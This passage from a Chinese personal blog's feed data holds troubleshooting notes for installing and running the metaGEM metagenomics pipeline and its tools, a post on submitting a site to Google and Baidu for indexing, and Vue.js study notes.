/home/gc/metaGEM/workflow/concoct/L1EFG190305--AM43/L1EFG190305--AM43.concoct-bins)) -t 48 -c 800 找到了相关解决方案 找到/envs/metagem/lib/python3.10/site-packages/sklearn/utils/validation.py 文件 修改语句 1feature_names = np.asarray(X.columns, dtype=object) 把这个语句注释掉然后添加 1feature_names = np.asarray(X.columns.astype(str), dtype=object) 报错2(maxbin2)：&#x2F;usr&#x2F;bin&#x2F;bash: line 28: run_MaxBin.pl: command not found 原因没有安装maxbin 下载 https://sourceforge.net/projects/maxbin/files/ 1234567wget https://sourceforge.net/projects/maxbin/files/MaxBin-2.2.7.tar.gztar -zxvf MaxBin-2.2.7.tar.gzcd MaxBin-2.2.7/srcmakecd ..apt-get install autoconf./autobuild_auxiliary 在最后一步报错Cannot unzip bowtie2 zip file. Please make sure that [unzip] works properly. 原因：安装源下载网速过慢导致无法运行 修正方法：找到.&#x2F;MaxBin-2.2.7&#x2F;buildapp文件，找到这一行 1$cmd = &quot;curl -L $URLBASE/$bowtie_f -k 1&gt;$bowtie_f &quot;; 注释掉并改成一下内容，注意后面有分号不要忘了 12#$cmd = &quot;curl -L $URLBASE/$bowtie_f -k 1&gt;$bowtie_f &quot;;$cmd = &quot;wget https://sourceforge.net/projects/bowtie-bio/files/bowtie2/2.2.3/bowtie2-2.2.3-source.zip&quot; 不要忘了把新生成的文件夹加入环境变量 1export PATH=&quot;/home/gc/MaxBin-2.2.7:$PATH&quot; 在输入下列语句之前一定要先进入到metawrap 环境然后配置下面的功能 123conda activate envs/metawrap checkm_db=&quot;/home/ubuntu/checkm/&quot;echo $&#123;checkm_db&#125; | checkm data setRoot $&#123;checkm_db&#125; 如果不配置好会得到以下报错 12It seems that the CheckM data folder has not been set yet or has been removed. Running: &#x27;checkm data setRoot&#x27;.Where should CheckM store it&#x27;s data? 然后输入运行程序 1bash metaGEM.sh -t binReassemble -j 2 -c 24 -m 150 -h 24 报错IOError: [Errno 2] No such file or directory: u’&#x2F;home&#x2F;gc&#x2F;checkm&#x2F;hmms&#x2F;phylo.hmm’或者It seems that the CheckM data folder has not been set yet or has been removed. Running: ‘checkm data setRoot’.Where should CheckM store it’s data? 1234567#先下载缺失的文件cd ~wget https://data.ace.uq.edu.au/public/CheckM_databases/checkm_data_2015_01_16.tar.gzmkdir checkmtar -zxvf checkm_data_2015_01_16.tar.gz -C ./checkmcheckm_db=&quot;/home/gc/checkm/&quot;echo $&#123;checkm_db&#125; | checkm data setRoot $&#123;checkm_db&#125; 终于在本地调试中发现了报错 解决 123找到这个文件的这一行File &quot;/home/gc/metaGEM/workflow/envs/metawrap/share/spades-3.13.0-0/share/spades/pyyaml3/constructor.py&quot;, line 126, in construct_mapping找到代码 if not isinstance(key, collections.Hashable):改成这样 if not isinstance(key, collections.abc.Hashable) 可视化输出 1bash metaGEM.sh -t binningVis 报错*/*reassembled_bins/*.fa: No such file or directory看reassembled_bins文件夹里面确实没有fa结尾的文件，这个嘶~，报错无从查起。那就再跑一遍bash metaGEM.sh -t binReassemble -j 2 -c 24 -m 150 -h 24这个命令吧。 可以看到在生成的中间文件中是有.fa结尾的文件的，而且还不少，因此我们监控一下在处理时发生了什么。 因为上次运行的时候有中断行为，因此重新运行一遍就好了 5用 GTDB-tk 进行分类首先让我们从 metWRAP 重组输出中提取我们的 DNA bins: 1bash metaGEM.sh -t extractDnaBins 运行 GTDB-tk 进行分类学分类: 1bash metaGEM.sh -t gtdbtk -j 2 -c 24 -m 80 -h 12 在计算相对丰度之后，我们将可视化分类注释。 报错，没有数据库12345678910conda uninstall gtdbtkconda install -c conda-forge -c bioconda gtdbtk -ydownload-db.sh#检验是否安装成功gtdbtk check_install#如果报错The GTDB-Tk reference data does not exist or is corrupted#则在Snakefile的1204行添加如下内容，并去掉注释#安装的数据库在以下路径gc为你电脑的名字/home/gc/metaGEM/workflow/envs/metagem/share/gtdbtk-1.7.0/dbexport GTDBTK_DATA_PATH=/home/gc/metaGEM/workflow/envs/metagem/share/gtdbtk-1.7.0/db 报错prodigal is not on the system path.安装prodigal 12345wget https://github.com/hyattpd/Prodigal/releases/download/v2.6.3/prodigal.linuxwget https://github.com/hyattpd/Prodigal/archive/v2.6.3.tar.gztar -zxvf v2.6.3.tar.gzcd Prodigal-2.6.3sudo make install 报错hmmalign is not on the system path.后面还有一些没有安装一块安装了 12345sudo apt install hmmerconda install -c bioconda pplacer#如果依赖报错则更改下列语句#conda install python=3.6 #安装fastANI需要python3.6这里降一下版本conda install -c conda-forge -c bioconda r-base=4 fastani 报错fastANI: error while loading shared libraries: libgsl.so.25 经过研究发现fastANI如果通过conda安装的话会报很多环境依赖的问题，因为在先前使用的是python3.10，网上有人说用python3.6才可以安装，于是我退回3.6发现依旧是有依赖问题无法安装，于是我寻求了手动编译安装的方法，如果有人conda install -c bioconda fastani 使用了上述语句成功安装，则不需要经过以下途径安装。 安装fastANI需要gsl依赖，在后面的安装中又出现了zlib库缺失的情况，我在这里就一块安装了 fastANI教程来自 奇怪的是.so.25按道理来说应该用2.5版本的，但是2.5版本编译以后出来的是.so.23，下面有一个测试脚本,并无法运行，猜测应该是要用.so.25的文件，于是我又安装了gsl2.7，安装后出现了.so.25文件，并且编译没有出现问题(怪) 先安装gsl和zlib再安装fastani 123456789101112131415161718192021222324252627282930313233343536#安装gslwget https://ftp.gnu.org/gnu/gsl/gsl-2.7.tar.gztar -zxvf gsl-2.7.tar.gzcd gsl-2.7./configuremakesudo make installvim /home/username/.bashrch#在末尾添加export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/libexport CFLAGS=&quot;-I/usr/local/include&quot;export LDFLAGS=&quot;-L/usr/local/lib&quot;#(验证)gsl是否安装成功使用后面的测试脚本#安装zlibwget https://www.zlib.net/zlib-1.3.1.tar.gztar -zxvf zlib-1.3.1.tar.gz cd zlib-1.3.1./configuremakemake checksudo make install#zlib的验证 zlib提供了测试样例，在examples里面cd zlib-1.3.1/examplesgcc -c enough.cgcc enough.o./a.out #成功运行截图在后面#安装fastaniwget https://github.com/ParBLiSS/FastANI/archive/master.zipunzip master.zipcd FastANI-master/autoconf./configure #--with-gsl=/usr/ 因为我们已经把gsl加入到环境变量里去了，所以这里我们把后面的语句注释掉make#验证fastani是否安装成功fastANI#返回Provide reference file (s) 测试脚本 123456789101112//test.c#include &lt;stdio.h&gt;#include &lt;gsl/gsl_sf_bessel.h&gt; intmain (void)&#123; double x = 5.0; double y = gsl_sf_bessel_J0 (x); printf (&quot;J0(%g) = %.18e/n&quot;, x, y); return 0;&#125; 123gcc -c test.cgcc test.o -lgsl -lgslcblas -lm./a.out zlib的验证 6 bwa 和 samtools 计算相对丰度1bash metaGEM.sh -t abundance -j 2 -c 24 -m 80 -h 12 可视化分类和相对丰富度: 1bash metaGEM.sh -t compositionVis 报错Error in library(tidytext) : there is no package called ‘tidytext’发现这个tidytext是一个R包，安装R包环境 先安装R包环境 1234567wget https://cran.r-project.org/src/base/R-4/R-4.3.2.tar.gztar -zxvf R-4.3.2.tar.gzcd R-4.3.2#! 编译，指定安装目录./configure --prefix=&#x27;/home/gc/R/R-4.2.2/&#x27; --enable-R-shlib=yes --with-readline=yes --with-libpng=yes --with-x=yes --with-blas --with-tcltk --with-pcrel#! 安装make&amp;&amp;make install 在安装其中的依赖 123R#进入R环境然后输入下列语句install.packages(c(&quot;mnormt&quot;, &quot;psych&quot;, &quot;SnowballC&quot;, &quot;hunspell&quot;, &quot;broom&quot;, &quot;tokenizers&quot;, &quot;janeaustenr&quot;))install.packages(&quot;tidytext&quot;) 以下是文件树 1tree -I &#x27;env|.snakemake|temp&#x27; &gt; file-tree.txt","categories":[{"name":"MAGs云分析","slug":"MAGs云分析","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/"},{"name":"生物计算机科学","slug":"MAGs云分析/生物计算机科学","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/%E7%94%9F%E7%89%A9%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"}],"tags":[{"name":"metaGEM","slug":"metaGEM","permalink":"https://snowman12137.github.io/tags/metaGEM/"}],"author":"Sn0wma1n"},{"title":"如何让自己的网站被搜索到","slug":"如何让自己的网站被搜索到","date":"2024-02-04T16:00:00.000Z","updated":"2024-03-02T14:13:53.622Z","comments":true,"path":"2024/02/05/如何让自己的网站被搜索到/","link":"","permalink":"https://snowman12137.github.io/2024/02/05/%E5%A6%82%E4%BD%95%E8%AE%A9%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BD%91%E7%AB%99%E8%A2%AB%E6%90%9C%E7%B4%A2%E5%88%B0/","excerpt":"","text":"如何让自己的网站被搜索到在有了个人网站以后，总希望更多的人来踩一踩看一看。也希望自己写的博客能够真的分享被别人搜索到，达到博客应有的分享功能。但是了解以后才发现：网站能够被搜索引擎搜索到需要自己的网站被搜索引擎收录。一般来说，能被搜索引擎所收录有三种途径： 交钱：一次点击 $0.05 USD， 适用于商业推广，并会现实在右栏（广告栏）。 网站本身知名度高，影响力高：Google 对搜索结果的排名目前使用page rank算法，简单来说越多影响力大的知名网站能够导向你的网站，你的网站的得分就越高，就会排在前面。如果你的网站的影响力已经很大，搜索引擎会主动去添加索引。 申请：自己主动向搜索引擎添加自己的链接，请求搜索引擎使用爬虫检索你的网站。 步骤 查看网站是否被Google收录 （应该没有） 提交URL并验证所有权 添加Sitemaps给爬虫加个速 手动请求（重新索引） 百度搜索添加 1.查看网站是否被google收录查看网站是否被 Google 收录很简单：打开Google搜索，在搜索框内输入 1site:your-websit-url&gt; 如果没有被收录进行以下操作，不用多久就会被搜索到了 2.提交URL并验证所有权可能你已经观察到了，无论有没有被Google收录，Google都会在第一条显示Google Search Console。个人猜测，这是出于安全与隐私方面的考虑。Google把是否允许收录网站的权利交给真正的站主。 a.点击添加资源 b.点击右边添加网址前缀 c. 建议选择HTML文件验证方法一共有5种验证方法： HTML 文件：通过在网址根目录添加一个随机生成的.html文件验证。优点：不需要改动原有代码。 HTML 标记：通过向首页添加元标记，将元标记复制到第一个&lt;head&gt;中验证。缺点：需要改动原有index.html Google Analytics：注册Google Analytics账号后将analytics.js或gtag.js代码段添加到&lt;head&gt;中。缺点：麻烦，并需要改动原有代码。优点：可以有新的feature。 Google Tag Manager：同上。 DNS 设置：将TXT记录复制到DNS配置中。缺点：麻烦，响应慢（最长1天），有的服务商很难找到DNS配置入口。 以下操作HTML文件验证在后文操作 3.添加Sitemaps给爬虫加个速Sitemaps是什么？站点地图(Site Map)是用来注明网站结构的文件，可以让搜索引擎的爬虫了解你的网站结构，以便于高效爬取内容，快速建立索引。Google 等搜索引擎会读取此文件，以便更加智能地抓取你的网站。站点地图会告诉 Google 你认为网站中的哪些网页和文件比较重要，还会提供与这些文件有关的重要信息：以网页为例，这些信息包括网页上次更新的时间、网页更改的频率，以及网页是否有其他语言版本。 如果你的网站上的网页链接得当，那么 Google 通常能够发现其中的大多数网页。即便如此，站点地图仍有助于我们更加高效地抓取规模更大、更复杂的网站或更特殊的文件。 在以下情况下，可能需要站点地图： 网站规模很大。 网站有大量内容页归档，这些内容页之间互不关联或缺少有效链接。 网站为新网站且指向该网站的外部链接不多。 网站包含大量富媒体内容（视频、图片）或显示在 Google 新闻中。 在以下情况下，可能不需要站点地图： 网站规模“较小”。规模较小是指网站上的网页数不超过 500 个。 使用了简单网站托管服务，例如 Blogger 或 Wix。 网站已在内部全面建立链接。这意味着，Google 可以沿着首页的链接找到网站上的所有重要网页。 在索引中需要出现的媒体文件（视频、图片）或新闻页面不多。 通过XML-Sitemaps.com生成 a.点击进入XML-Sitemaps.com，输入个人网站地址，点击start。 b.等待搜索完成 预览一下 c.下载sitemap.xml文件并上传到网站根目录下 d.在Google Search Console提交站点地图 4.手动请求检查我这里检查后看到并没有收录，点击请求编入索引 等待一两分钟后，抓取成功 刚提交还没有刷新出来，等一段时间看看 5.百度打开百度搜索资源平台 下载验证文件，把下载的文件添加到suorce文件夹中，每一次提交时会刷新source的内容 但是这是这个HTML文件，我们的主题会自动把它给渲染导致验证失败，我们只需要找到主题的配置文件搜索skip，会有跳过渲染的选项，把文件添加到里面即可(注意一定要hexo clean 才会更新配置文件) 然后点击验证就成功辣，过一段时间后你可以通过谷歌收录网站或者搜索框输入site:xxx.com 来查看收录情况和流量情况 晚上突然想起来搜索了一下，可以被搜索到了","categories":[{"name":"其他","slug":"其他","permalink":"https://snowman12137.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"博客问题","slug":"博客问题","permalink":"https://snowman12137.github.io/tags/%E5%8D%9A%E5%AE%A2%E9%97%AE%E9%A2%98/"}],"author":"Sn0wma1n"},{"title":"VUE学习(二)","slug":"VUE学习-二","date":"2024-02-03T16:00:00.000Z","updated":"2024-03-02T14:15:11.695Z","comments":true,"path":"2024/02/04/VUE学习-二/","link":"","permalink":"https://snowman12137.github.io/2024/02/04/VUE%E5%AD%A6%E4%B9%A0-%E4%BA%8C/","excerpt":"","text":"VUE学习(二)1.快速上手安装 1npm create vue@latest 用最朴素的配置 123456789101112✔ Project name: … &lt;your-project-name&gt;✔ Add TypeScript? … No / Yes✔ Add JSX Support? … No / Yes✔ Add Vue Router for Single Page Application development? … No / Yes✔ Add Pinia for state management? … No / Yes✔ Add Vitest for Unit testing? … No / Yes✔ Add an End-to-End Testing Solution? … No / Cypress / Playwright✔ Add ESLint for code quality? … No / Yes✔ Add Prettier for code formatting? … No / YesScaffolding project in ./&lt;your-project-name&gt;...Done. 启动 123cd &lt;your-project-name&gt;npm installnpm run dev 2 创建一个应用每个 Vue 应用都是通过 [createApp](https://cn.vuejs.org/api/application.html#createapp) 函数创建一个新的 应用实例： 12345import &#123; createApp &#125; from &#x27;vue&#x27;const app = createApp(&#123; /* 根组件选项 */&#125;) 根组件我们传入 createApp 的对象实际上是一个组件，每个应用都需要一个“根组件”，其他组件将作为其子组件。 如果你使用的是单文件组件，我们可以直接从另一个文件中导入根组件。 12345import &#123; createApp &#125; from &#x27;vue&#x27;// 从一个单文件组件中导入根组件import App from &#x27;./App.vue&#x27;const app = createApp(App) 挂在应用应用实例必须在调用了 .mount() 方法后才会渲染出来。该方法接收一个“容器”参数，可以是一个实际的 DOM 元素或是一个 CSS 选择器字符串： 1&lt;div id=&quot;app&quot;&gt;&lt;/div&gt; 1app.mount(&#x27;#app&#x27;) 应用根组件的内容将会被渲染在容器元素里面。容器元素自己将不会被视为应用的一部分。 .mount() 方法应该始终在整个应用配置和资源注册完成后被调用。同时请注意，不同于其他资源注册方法，它的返回值是根组件实例而非应用实例。 DOM 中的根组件模板根组件的模板通常是组件本身的一部分，但也可以直接通过在挂载容器内编写模板来单独提供： 123&lt;div id=&quot;app&quot;&gt; &lt;button @click=&quot;count++&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/div&gt; 1234567891011import &#123; createApp &#125; from &#x27;vue&#x27;const app = createApp(&#123; data() &#123; return &#123; count: 0 &#125; &#125;&#125;)app.mount(&#x27;#app&#x27;) 当根组件没有设置 template 选项时，Vue 将自动使用容器的 innerHTML 作为模板。 DOM 内模板通常用于无构建步骤的 Vue 应用程序。它们也可以与服务器端框架一起使用，其中根模板可能是由服务器动态生成的。 回到我们创建的实例找到src&#x2F;main.js文件 源代码是这样的 1createApp(App).mount(&#x27;#app&#x27;) 我们可以按照上面的形式改成这样 123456789//根组件const app = createApp(App,&#123; data() &#123; return &#123; count: 0 &#125; &#125; &#125;) app.mount(&#x27;#app&#x27;)//挂载 3 模板语法Vue 使用一种基于 HTML 的模板语法，使我们能够声明式地将其组件实例的数据绑定到呈现的 DOM 上。所有的 Vue 模板都是语法层面合法的 HTML，可以被符合规范的浏览器和 HTML 解析器解析。 在底层机制中，Vue 会将模板编译成高度优化的 JavaScript 代码。结合响应式系统，当应用状态变更时，Vue 能够智能地推导出需要重新渲染的组件的最少数量，并应用最少的 DOM 操作。 如果你对虚拟 DOM 的概念比较熟悉，并且偏好直接使用 JavaScript，你也可以结合可选的 JSX 支持直接手写渲染函数而不采用模板。但请注意，这将不会享受到和模板同等级别的编译时优化。 a.Attribute 绑定双大括号不能在 HTML attributes 中使用。想要响应式地绑定一个 attribute，应该使用 v-bind 指令： 1&lt;div v-bind:id=&quot;dynamicId&quot;&gt;&lt;/div&gt; v-bind 指令指示 Vue 将元素的 id attribute 与组件的 dynamicId 属性保持一致。如果绑定的值是 null 或者 undefined，那么该 attribute 将会从渲染的元素上移除。 因为 v-bind 非常常用，我们提供了特定的简写语法 1&lt;div :id=&quot;dynamicId&quot;&gt;&lt;/div&gt; 动态绑定多个值 如果你有像这样的一个包含多个 attribute 的 JavaScript 对象： 1234const objectOfAttrs = &#123; id: &#x27;container&#x27;, class: &#x27;wrapper&#x27;&#125; 通过不带参数的 v-bind，你可以将它们绑定到单个元素上： 1&lt;div v-bind=&quot;objectOfAttrs&quot;&gt;&lt;/div&gt; b 使用 JavaScript 表达式至此，我们仅在模板中绑定了一些简单的属性名。但是 Vue 实际上在所有的数据绑定中都支持完整的 JavaScript 表达式： 1234567&#123;&#123; number + 1 &#125;&#125;&#123;&#123; ok ? &#x27;YES&#x27; : &#x27;NO&#x27; &#125;&#125;&#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125;&lt;div :id=&quot;`list-$&#123;id&#125;`&quot;&gt;&lt;/div&gt; 在 Vue 模板内，JavaScript 表达式可以被使用在如下场景上： 在文本插值中 (双大括号) 在任何 Vue 指令 (以 v- 开头的特殊 attribute) attribute 的值中 c.指令 Directives指令是带有 v- 前缀的特殊 attribute。Vue 提供了许多**内置指令**，包括上面我们所介绍的 v-bind 和 v-html。 指令 attribute 的期望值为一个 JavaScript 表达式 (除了少数几个例外，即之后要讨论到的 v-for、v-on 和 v-slot)。一个指令的任务是在其表达式的值变化时响应式地更新 DOM。以 [v-if](https://cn.vuejs.org/api/built-in-directives.html#v-if) 为例： 1&lt;p v-if=&quot;seen&quot;&gt;Now you see me&lt;/p&gt; 这里，v-if 指令会基于表达式 seen 的值的真假来移除&#x2F;插入该 &lt;p&gt; 元素。 另一个例子是 v-on 指令，它将监听 DOM 事件： 1234&lt;a v-on:click=&quot;doSomething&quot;&gt; ... &lt;/a&gt;&lt;!-- 简写 --&gt;&lt;a @click=&quot;doSomething&quot;&gt; ... &lt;/a&gt; 这里的参数是要监听的事件名称：click。v-on 有一个相应的缩写，即 @ 字符。我们之后也会讨论关于事件处理的更多细节。 d.动态参数同样在指令参数上也可以使用一个 JavaScript 表达式，需要包含在一对方括号内： 12345678&lt;!--注意，参数表达式有一些约束，参见下面“动态参数值的限制”与“动态参数语法的限制”章节的解释--&gt;&lt;a v-bind:[attributeName]=&quot;url&quot;&gt; ... &lt;/a&gt;&lt;!-- 简写 --&gt;&lt;a :[attributeName]=&quot;url&quot;&gt; ... &lt;/a&gt; 这里的 attributeName 会作为一个 JavaScript 表达式被动态执行，计算得到的值会被用作最终的参数。举例来说，如果你的组件实例有一个数据属性 attributeName，其值为 &quot;href&quot;，那么这个绑定就等价于 v-bind:href。 相似地，你还可以将一个函数绑定到动态的事件名称上： 1234&lt;a v-on:[eventName]=&quot;doSomething&quot;&gt; ... &lt;/a&gt;&lt;!-- 简写 --&gt;&lt;a @[eventName]=&quot;doSomething&quot;&gt; ... &lt;/a&gt; e.修饰符 Modifiers修饰符是以点开头的特殊后缀，表明指令需要以一些特殊的方式被绑定。例如 .prevent 修饰符会告知 v-on 指令对触发的事件调用 event.preventDefault()： 1&lt;form @submit.prevent=&quot;onSubmit&quot;&gt;...&lt;/form&gt; 之后在讲到 [v-on](https://cn.vuejs.org/guide/essentials/event-handling.html#event-modifiers) 和 [v-model](https://cn.vuejs.org/guide/essentials/forms.html#modifiers) 的功能时，你将会看到其他修饰符的例子。 最后，在这里你可以直观地看到完整的指令语法： 4.声明响应式状态a.ref()在组合式 API 中，推荐使用 [ref()](https://cn.vuejs.org/api/reactivity-core.html#ref) 函数来声明响应式状态： 12import &#123; ref &#125; from &#x27;vue&#x27;const count = ref(0) ref() 接收参数，并将其包裹在一个带有 .value 属性的 ref 对象中返回： 12345const count = ref(0)console.log(count) // &#123; value: 0 &#125;console.log(count.value) // 0count.value++console.log(count.value) // 1 要在组件模板中访问 ref，请从组件的 setup() 函数中声明并返回它们： 1234567891011import &#123; ref &#125; from &#x27;vue&#x27;export default &#123; // `setup` 是一个特殊的钩子，专门用于组合式 API。 setup() &#123; const count = ref(0) // 将 ref 暴露给模板 return &#123; count &#125; &#125;&#125; 1&lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt; 注意，在模板中使用 ref 时，我们不需要附加 .value。为了方便起见，当在模板中使用时，ref 会自动解包 (有一些**注意事项**)。 你也可以直接在事件监听器中改变一个 ref： 123&lt;button @click=&quot;count++&quot;&gt; &#123;&#123; count &#125;&#125;&lt;/button&gt; 对于更复杂的逻辑，我们可以在同一作用域内声明更改 ref 的函数，并将它们作为方法与状态一起公开： 123456789101112131415161718import &#123; ref &#125; from &#x27;vue&#x27;export default &#123; setup() &#123; const count = ref(0) function increment() &#123; // 在 JavaScript 中需要 .value count.value++ &#125; // 不要忘记同时暴露 increment 函数 return &#123; count, increment &#125; &#125;&#125; 然后，暴露的方法可以被用作事件监听器： 123&lt;button @click=&quot;increment&quot;&gt; &#123;&#123; count &#125;&#125;&lt;/button&gt; b**&lt;script setup&gt;**在 setup() 函数中手动暴露大量的状态和方法非常繁琐。幸运的是，我们可以通过使用单文件组件 (SFC) 来避免这种情况。我们可以使用 &lt;script setup&gt; 来大幅度地简化代码： 123456789101112131415&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;const count = ref(0)function increment() &#123; count.value++&#125;&lt;/script&gt;&lt;template&gt; &lt;button @click=&quot;increment&quot;&gt; &#123;&#123; count &#125;&#125; &lt;/button&gt;&lt;/template&gt; &lt;script setup&gt; 中的顶层的导入、声明的变量和函数可在同一组件的模板中直接使用。你可以理解为模板是在同一作用域内声明的一个 JavaScript 函数——它自然可以访问与它一起声明的所有内容。 c**reactive()**还有另一种声明响应式状态的方式，即使用 reactive() API。与将内部值包装在特殊对象中的 ref 不同，reactive() 将使对象本身具有响应性： 12import &#123; reactive &#125; from &#x27;vue&#x27;const state = reactive(&#123; count: 0 &#125;) 在模板中使用： 123&lt;button @click=&quot;state.count++&quot;&gt; &#123;&#123; state.count &#125;&#125;&lt;/button&gt; 响应式对象是 JavaScript 代理，其行为就和普通对象一样。不同的是，Vue 能够拦截对响应式对象所有属性的访问和修改，以便进行依赖追踪和触发更新。 reactive() 将深层地转换对象：当访问嵌套对象时，它们也会被 reactive() 包装。当 ref 的值是一个对象时，ref() 也会在内部调用它。与浅层 ref 类似，这里也有一个 shallowReactive() API 可以选择退出深层响应性。 Reactive Proxy vs. Original 值得注意的是，reactive() 返回的是一个原始对象的 **Proxy**，它和原始对象是不相等的：（因为一个是对象一个是{}） 1234const raw = &#123;&#125;const proxy = reactive(raw)// 代理对象和原始对象不是全等的console.log(proxy === raw) // false reactive() 的局限性 有限的值类型：它只能用于对象类型 (对象、数组和如 Map、Set 这样的**集合类型)。它不能持有如 string、number 或 boolean 这样的原始类型**。 不能替换整个对象：由于 Vue 的响应式跟踪是通过属性访问实现的，因此我们必须始终保持对响应式对象的相同引用。这意味着我们不能轻易地“替换”响应式对象，因为这样的话与第一个引用的响应性连接将丢失： 12345let state = reactive(&#123; count: 0 &#125;)// 上面的 (&#123; count: 0 &#125;) 引用将不再被追踪// (响应性连接已丢失！)state = reactive(&#123; count: 1 &#125;) 对解构操作不友好：当我们将响应式对象的原始类型属性解构为本地变量时，或者将该属性传递给函数时，我们将丢失响应性连接： 1234567891011const state = reactive(&#123; count: 0 &#125;)// 当解构时，count 已经与 state.count 断开连接let &#123; count &#125; = state// 不会影响原始的 statecount++// 该函数接收到的是一个普通的数字// 并且无法追踪 state.count 的变化// 我们必须传入整个对象以保持响应性callSomeFunction(state.count) 由于这些限制，我们建议使用 ref() 作为声明响应式状态的主要 API。 5.计算属性a.基础示例模板中的表达式虽然方便，但也只能用来做简单的操作。如果在模板中写太多逻辑，会让模板变得臃肿，难以维护。比如说，我们有这样一个包含嵌套数组的对象： 12345678const author = reactive(&#123; name: &#x27;John Doe&#x27;, books: [ &#x27;Vue 2 - Advanced Guide&#x27;, &#x27;Vue 3 - Basic Guide&#x27;, &#x27;Vue 4 - The Mystery&#x27; ]&#125;) 我们想根据 author 是否已有一些书籍来展示不同的信息： 12&lt;p&gt;Has published books:&lt;/p&gt;&lt;span&gt;&#123;&#123; author.books.length &gt; 0 ? &#x27;Yes&#x27; : &#x27;No&#x27; &#125;&#125;&lt;/span&gt; 这里的模板看起来有些复杂。我们必须认真看好一会儿才能明白它的计算依赖于 author.books。更重要的是，如果在模板中需要不止一次这样的计算，我们可不想将这样的代码在模板里重复好多遍。 因此我们推荐使用计算属性来描述依赖响应式状态的复杂逻辑。这是重构后的示例： 12345678910111213141516171819202122&lt;script setup&gt;import &#123; reactive, computed &#125; from &#x27;vue&#x27;const author = reactive(&#123; name: &#x27;John Doe&#x27;, books: [ &#x27;Vue 2 - Advanced Guide&#x27;, &#x27;Vue 3 - Basic Guide&#x27;, &#x27;Vue 4 - The Mystery&#x27; ]&#125;)// 一个计算属性 refconst publishedBooksMessage = computed(() =&gt; &#123; return author.books.length &gt; 0 ? &#x27;Yes&#x27; : &#x27;No&#x27;&#125;)&lt;/script&gt;&lt;template&gt; &lt;p&gt;Has published books:&lt;/p&gt; &lt;span&gt;&#123;&#123; publishedBooksMessage &#125;&#125;&lt;/span&gt;&lt;/template&gt; 我们在这里定义了一个计算属性 publishedBooksMessage。computed() 方法期望接收一个 getter 函数，返回值为一个计算属性 ref。和其他一般的 ref 类似，你可以通过 publishedBooksMessage.value 访问计算结果。计算属性 ref 也会在模板中自动解包，因此在模板表达式中引用时无需添加 .value。 Vue 的计算属性会自动追踪响应式依赖。它会检测到 publishedBooksMessage 依赖于 author.books，所以当 author.books 改变时，任何依赖于 publishedBooksMessage 的绑定都会同时更新。 b.计算属性缓存 vs 方法你可能注意到我们在表达式中像这样调用一个函数也会获得和计算属性相同的结果： 1&lt;p&gt;&#123;&#123; calculateBooksMessage() &#125;&#125;&lt;/p&gt; 1234// 组件中function calculateBooksMessage() &#123; return author.books.length &gt; 0 ? &#x27;Yes&#x27; : &#x27;No&#x27;&#125; 若我们将同样的函数定义为一个方法而不是计算属性，两种方式在结果上确实是完全相同的，然而，不同之处在于计算属性值会基于其响应式依赖被缓存。一个计算属性仅会在其响应式依赖更新时才重新计算。这意味着只要 author.books 不改变，无论多少次访问 publishedBooksMessage 都会立即返回先前的计算结果，而不用重复执行 getter 函数。 这也解释了为什么下面的计算属性永远不会更新，因为 Date.now() 并不是一个响应式依赖： 1const now = computed(() =&gt; Date.now()) 相比之下，方法调用总是会在重渲染发生时再次执行函数。 为什么需要缓存呢？想象一下我们有一个非常耗性能的计算属性 list，需要循环一个巨大的数组并做许多计算逻辑，并且可能也有其他计算属性依赖于 list。没有缓存的话，我们会重复执行非常多次 list 的 getter，然而这实际上没有必要！如果你确定不需要缓存，那么也可以使用方法调用。 c.可写计算属性计算属性默认是只读的。当你尝试修改一个计算属性时，你会收到一个运行时警告。只在某些特殊场景中你可能才需要用到“可写”的属性，你可以通过同时提供 getter 和 setter 来创建： 123456789101112131415161718&lt;script setup&gt;import &#123; ref, computed &#125; from &#x27;vue&#x27;const firstName = ref(&#x27;John&#x27;)const lastName = ref(&#x27;Doe&#x27;)const fullName = computed(&#123; // getter get() &#123; return firstName.value + &#x27; &#x27; + lastName.value &#125;, // setter set(newValue) &#123; // 注意：我们这里使用的是解构赋值语法 [firstName.value, lastName.value] = newValue.split(&#x27; &#x27;) &#125;&#125;)&lt;/script&gt; 现在当你再运行 fullName.value = &#39;John Doe&#39; 时，setter 会被调用而 firstName 和 lastName 会随之更新。 soga好神奇 今天学到这里，下课！","categories":[{"name":"前端学习","slug":"前端学习","permalink":"https://snowman12137.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"前端学习,VUE","slug":"前端学习-VUE","permalink":"https://snowman12137.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0-VUE/"}],"author":"Sn0wma1n"},{"title":"VUE学习(一)","slug":"VUE学习-一","date":"2024-02-02T16:00:00.000Z","updated":"2024-03-02T14:15:00.558Z","comments":true,"path":"2024/02/03/VUE学习-一/","link":"","permalink":"https://snowman12137.github.io/2024/02/03/VUE%E5%AD%A6%E4%B9%A0-%E4%B8%80/","excerpt":"","text":"VUE学习(一)教程来自https://cn.vuejs.org/tutorial https://cn.vuejs.org/guide/essentials/application.html 1.创建一个VUE应用1npm create vue@latest 然后安装依赖并启动服务器 123cd &lt;your-project-name&gt;npm installnpm run dev install页面卡了很久，应该是没换源 123456// 配置nmp代理来提高速度，如设置淘宝镜像npm config set registry https://registry.npm.taobao.org // 查看配置是否成功npm config get registry // 成功后重新npm install安装npm install 2.声明式渲染你在编辑器中看到的是一个 Vue 单文件组件 (Single-File Component，缩写为 SFC)。SFC 是一种可复用的代码组织形式，它将从属于同一个组件的 HTML、CSS 和 JavaScript 封装在使用 .vue 后缀的文件中。 Vue 的核心功能是声明式渲染：通过扩展于标准 HTML 的模板语法，我们可以根据 JavaScript 的状态来描述 HTML 应该是什么样子的。当状态改变时，HTML 会自动更新。 能在改变时触发更新的状态被称作是响应式的。我们可以使用 Vue 的 reactive() API 来声明响应式状态。由 reactive() 创建的对象都是 JavaScript **Proxy**，其行为与普通对象一样： 